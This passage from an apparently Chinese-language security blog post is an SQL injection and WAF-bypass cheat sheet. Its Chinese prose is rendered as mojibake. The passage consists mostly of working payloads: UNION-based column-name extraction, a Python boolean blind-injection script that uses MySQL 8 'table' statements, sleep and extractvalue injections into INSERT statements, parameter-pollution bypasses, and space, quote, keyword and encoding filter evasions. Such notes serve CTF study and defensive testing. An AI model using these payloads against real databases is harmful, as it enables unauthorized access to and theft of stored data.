class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b)c<span class="hljs-comment">--+</span><br># è·å–ç¬¬ä¸€åˆ—çš„åˆ—å<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id,username))c<span class="hljs-comment">--+</span><br># è·å–æ¬¡åˆ—åŠåç»­åˆ—å<br></code></pre></td></tr></table></figure><h4 id="union-selecté‡å‘½åæ³•"><a href="#union-selecté‡å‘½åæ³•" class="headerlink" title="union selecté‡å‘½åæ³•"></a><code>union selecté‡å‘½åæ³•</code></h4><p>ä¸è·å–åˆ—åæƒ…å†µä¸‹æŸ¥åˆ—,ä»¥æŸ¥ç¬¬äºŒåˆ—ä¸ºä¾‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> group_concat(b) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)a;<br># ä¹Ÿå¯ä»¥æŸ¥å¤šä¸ªåˆ—<br><span class="hljs-keyword">select</span> concat(`<span class="hljs-number">2</span>`,<span class="hljs-number">0x2d</span>,`<span class="hljs-number">3</span>`) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span>;<br># <span class="hljs-number">0x2d</span>ä¼šè½¬æ¢æˆå­—ç¬¦<span class="hljs-string">&#x27;-&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œå°†ç¬¬äºŒåˆ—å–åˆ«åä¸ºb(å¦‚æœåå¼•å·&#96;æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä¸å–åˆ«åï¼Œç›´æ¥ç”¨â¬‡ï¸)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> â€¦â€¦<br></code></pre></td></tr></table></figure><p>ç»“å°¾çš„aå¯ä»¥æ›¿æ¢æˆä»»æ„å­—ç¬¦ï¼Œè¿™æ˜¯ç”¨æ¥å‘½åçš„</p><p>åŸç†æ˜¯è”åˆæŸ¥è¯¢æ—¶åˆ—åæ˜¾ç¤ºçš„æ˜¯å‰ä¸€ä¸ªselectçš„ç»“æœï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªselectæ˜¯<code>select 1,2 as b,3 </code>å°†åˆ—åé‡å‘½åä¸º1 b 3ï¼Œç„¶åå†å°†è¿™ä¸ªæ–°è¡¨å‘½åä¸ºaï¼Œå†è¿›è¡ŒæŸ¥è¯¢</p></blockquote><h3 id="selectè¢«è¿‡æ»¤"><a href="#selectè¢«è¿‡æ»¤" class="headerlink" title="selectè¢«è¿‡æ»¤"></a>selectè¢«è¿‡æ»¤</h3><p><a href="https://www.freebuf.com/articles/web/275528.html">åŸºäºmysql8ç‰¹æ€§çš„sqlæ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>mysql 8.0.19<code>æ–°å¢è¯­å¥</code>table </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">table</span> users; <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><blockquote><p>tableä¸èƒ½åŠ whereå­å¥ï¼Œä¸å…è®¸è¡Œè¿‡æ»¤ï¼Œæ˜¾ç¤ºæ‰€æœ‰åˆ—ï¼Œä½†å¯ä»¥ç”¨æ¥ç›²æ³¨è¡¨å</p></blockquote><h4 id="tableç›²æ³¨è„šæœ¬"><a href="#tableç›²æ³¨è„šæœ¬" class="headerlink" title="tableç›²æ³¨è„šæœ¬"></a>tableç›²æ³¨è„šæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#orio1e</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>result=<span class="hljs-string">&#x27;0x&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>result+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">return</span> result<br>dic=[<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>,<br>         <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,]  <span class="hljs-comment"># å­—å…¸</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dic)):<br><span class="hljs-built_in">print</span>(dic[j])<br>url=<span class="hljs-string">&quot;http://127.0.0.1:8010&quot;</span><br><span class="hljs-comment">#ç¬¬ä¸€ä¸ªå­—æ®µ</span><br><span class="hljs-comment">#ç»“æœ:1</span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><span class="hljs-comment">#çˆ†ç¬¬äºŒä¸ªå­—æ®µ</span><br><span class="hljs-comment">#ç»“æœ:guest</span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><span class="hljs-comment">#çˆ†ç¬¬ä¸‰ä¸ªå­—æ®µ</span><br><span class="hljs-comment">#ç»“æœ:123456</span><br><span class="hljs-comment">#å› ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦å®Œæˆåé•¿åº¦ç›¸ç­‰åˆåˆ¤æ–­ä¸ºå‡ æ‰€ä»¥æœ€åä¸€ä¸ªå­—ç¬¦åº”ä¸ºå…¶ä¸‹ä¸€ä¸ªå­—æ¯</span><br><span class="hljs-comment">#ä½†æ˜¯è¿™ä»…é™æœ€åä¸€ä¸ªå­—æ®µ</span><br><span class="hljs-comment">#æ‰€ä»¥æ­£ç¡®ç»“æœæ˜¯we1c0mehacker </span><br>payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br><br>res=requests.post(url=url,data=payload)<br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(res.text[-<span class="hljs-number">20</span>:])<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;emmmmm&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;no&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-comment">#è¿”å›å‡æ—¶è¡¨ç¤ºä¸Šä¸€ä¸ªå­—æ¯å³ä¸ºæ­£ç¡®ç»“æœ</span><br>result+=dic[j-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„å¾€å‰å›æº¯</p><p>mysqlæ¯”è¾ƒï¼Œä»ç¬¬ä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯æ¯”è¾ƒasciiçš„å¤§å°ï¼Œä¸€æ¬¡å¾€å ,å¹¶ä¸”å¤šåˆ—çš„æ¯”è¾ƒæ—¶ä»ç¬¬ä¸€åˆ—çš„ç¬¬ä¸€ä½å¼€å§‹çš„</p><p>mysqlä¸­å¯¹charå‹å¤§å°å†™æ˜¯ä¸æ•æ„Ÿçš„ï¼Œç›²æ³¨çš„æ—¶å€™è¦ä¹ˆå¯ä»¥ä½¿ç”¨hexæˆ–è€…binaryã€‚</p></blockquote><h4 id="valuesæ³¨å…¥"><a href="#valuesæ³¨å…¥" class="headerlink" title="valuesæ³¨å…¥"></a>valuesæ³¨å…¥</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;$log&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;testsetset&#x27;</span><span class="hljs-keyword">or</span> sleep(<span class="hljs-number">5</span>)) # <span class="hljs-string">&#x27;);</span><br><span class="hljs-string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>if((<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>),sleep(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)) # <span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨è”åˆæ³¨å…¥ä»£æ›¿order by</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232669.jpg" alt="image-20220707223820177"></p><h3 id="WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´"><a href="#WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´" class="headerlink" title="WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´"></a>WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p><blockquote><p>apacheï¼ˆphpï¼‰è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid&#x3D;2 çš„å†…å®¹ã€‚Tomcatï¼ˆjspï¼‰è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid&#x3D;1 çš„å†…å®¹ã€‚</p><p>æˆ‘ä»¬å¾€å¾€åœ¨tomcat æœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFï¼Œå› æ­¤å¯ä»¥ä¼ å…¥ç¬¬ä¸€ä¸ªä¸ºåˆæ³•å‚æ•°ï¼Œç¬¬äºŒä¸ªé‡‡ç”¨æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232308.jpg" alt="image-20220708192908674"></p></blockquote><h3 id="ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼è¢«è¿‡æ»¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">/**/æ›¿ä»£ç©ºæ ¼<br><span class="hljs-meta prompt_">%</span><span class="language-bash">09 TAB é”®ï¼ˆæ°´å¹³ï¼‰</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0a æ–°å»ºä¸€è¡Œ</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0c æ–°çš„ä¸€é¡µ</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0d <span class="hljs-built_in">return</span> åŠŸèƒ½</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0b TAB é”®ï¼ˆå‚ç›´ï¼‰</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">a0 ç©ºæ ¼</span><br>() ä»£æ›¿ç©ºæ ¼ï¼Œåœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚<br></code></pre></td></tr></table></figure><blockquote><p>%a0æ˜¯ä¸€ä¸ªä¸æˆæ±‰å­—çš„ä¸­æ–‡å­—ç¬¦ï¼Œå› æ­¤æ­£åˆ™åŒ¹é…æ—¶ä¸ä¼šå½“ç©ºæ ¼è¿‡æ»¤ï¼Œè€Œè¿›å…¥sqlè¯­å¥åï¼Œmysqlä¸è®¤ä¸­æ–‡å­—ç¬¦ï¼Œå½“ç©ºæ ¼å¤„ç†</p></blockquote><h3 id="è¿‡æ»¤å•å¼•å·"><a href="#è¿‡æ»¤å•å¼•å·" class="headerlink" title="è¿‡æ»¤å•å¼•å·"></a>è¿‡æ»¤å•å¼•å·</h3><p>è½¬ä¹‰ç¬¦å·åŠæ³¨é‡Šæ²¡è¢«è¿‡æ»¤æ—¶ï¼Œå°†usernameé—­åˆçš„å•å¼•å·è½¬ä¹‰ï¼Œåœ¨passwordçš„è¾“å…¥ä¸­æ’å…¥å¸ƒå°”ç›²æ³¨è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin\<br>password<span class="hljs-operator">=</span><span class="hljs-keyword">or</span> <span class="hljs-number">2</span><span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27; or 2&gt;1#&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="å¤šç§æ³¨é‡Šç¬¦"><a href="#å¤šç§æ³¨é‡Šç¬¦" class="headerlink" title="å¤šç§æ³¨é‡Šç¬¦"></a>å¤šç§æ³¨é‡Šç¬¦</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-comment">--%20</span><br><span class="hljs-comment">/**/</span><br>#<br><span class="hljs-comment">--+</span><br><span class="hljs-comment">-- -</span><br><span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;<br>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;\x00<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><ul><li><p>å¤§å°å†™ç»•è¿‡</p></li><li><p>åŒå†™ç»•è¿‡ï¼ˆä¸»è¦ç”¨äºæºç ä¸­ä½¿ç”¨replaceæ›¿æ¢é»‘åå•ï¼‰</p></li><li><p>ç¼–ç ç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>å³<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸º<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)ã€‚<br><br>åå…­è¿›åˆ¶ç¼–ç <br><br><span class="hljs-keyword">SELECT</span>(extractvalue(<span class="hljs-number">0x3C613E61646D696E3C2F613E</span>,<span class="hljs-number">0x2f61</span>))<br><br>åŒé‡ç¼–ç ç»•è¿‡<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a <span class="hljs-operator">/</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,password<span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span>Users<span class="hljs-comment">--+</span><br><br>ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š    <br>å•å¼•å·ï¼š<span class="hljs-string">&#x27;</span><br><span class="hljs-string">%u0027 %u02b9 %u02bc</span><br><span class="hljs-string">%u02c8 %u2032</span><br><span class="hljs-string">%uff07 %c0%27</span><br><span class="hljs-string">%c0%a7 %e0%80%a7</span><br><span class="hljs-string">ç©ºç™½ï¼š</span><br><span class="hljs-string">%u0020 %uff00</span><br><span class="hljs-string">%c0%20 %c0%a0 %e0%80%a0</span><br><span class="hljs-string">å·¦æ‹¬å·(:</span><br><span class="hljs-string">%u0028 %uff08</span><br><span class="hljs-string">%c0%28 %c0%a8</span><br><span class="hljs-string">%e0%80%a8</span><br><span class="hljs-string">å³æ‹¬å·):</span><br><span class="hljs-string">%u0029 %uff09</span><br><span class="hljs-string">%c0%29 %c0%a9</span><br><span class="hljs-string">%e0%80%a9</span><br></code></pre></td></tr></table></figure></li><li><p>likeç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>#<br>å¯ç»•è¿‡å¯¹<span class="hljs-operator">=</span> <span class="hljs-operator">&gt;</span>ç­‰è¿‡æ»¤<br></code></pre></td></tr></table></figure></li><li><p>inç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;1234&#x27;</span>)#<br></code></pre></td></tr></table></figure><blockquote><p>inå¯ä»¥ä»£æ›¿â€™&#x3D;â€™ï¼Œåªæœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸€æ¨¡ä¸€æ ·æ—¶æ‰è¿”å›trueï¼Œæ³¨æ„æ‹¬å·ä¸èƒ½æ¼ï¼Œå¦åˆ™æŠ¥é”™</p></blockquote></li><li><p>è¿‡æ»¤union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union&#x27;</span><br>ç»•è¿‡æ–¹å¼ <span class="hljs-number">1</span><span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> userid)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤where</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where&#x27;</span><br>ç»•è¿‡æ–¹å¼ <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit&#x27;</span><br>ç»•è¿‡æ–¹å¼ <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>#user_idèšåˆä¸­user_idä¸º<span class="hljs-number">1</span>çš„<span class="hljs-keyword">user</span>ä¸ºadmim<br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤group by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by&#x27;</span><br>ç»•è¿‡æ–¹å¼ <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(group_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users ) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select&#x27;</span><br>åªèƒ½æŸ¥è¯¢æœ¬è¡¨ä¸­çš„æ•°æ®<br>ç»•è¿‡æ–¹å¼ <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ 